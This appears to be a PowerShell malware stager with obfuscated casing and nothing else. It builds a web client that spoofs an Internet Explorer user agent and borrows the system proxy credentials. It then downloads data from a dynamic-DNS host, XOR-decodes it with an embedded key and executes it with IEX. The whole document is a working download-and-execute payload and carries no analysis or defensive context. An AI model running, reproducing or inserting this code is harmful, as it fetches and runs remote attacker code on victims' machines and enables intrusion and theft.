
$WC=NeW-OBjeCt SyStem.NEt.WEBClienT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wC.HeAdErS.ADD('User-Agent',$u);$Wc.PROxY = [SysTem.NeT.WeBReQuEsT]::DEFaUltWeBPROxy;$wc.PROXY.CReDEnTIaLS = [SYSTEM.NeT.CREdENtIalCAcHe]::DEfAulTNetworkCRedenTIaLS;$K='/6\Q:rqGBP`Xn[OW$AUR-lbp?*M~IcH<';$I=0;[chAr[]]$b=([chAR[]]($WC.DOwNLOAdSTRinG("http://sparta34.no-ip.biz:443/index.asp")))|%{$_-BXOR$k[$I++%$k.LEnGth]};IEX ($B-JOIN'')

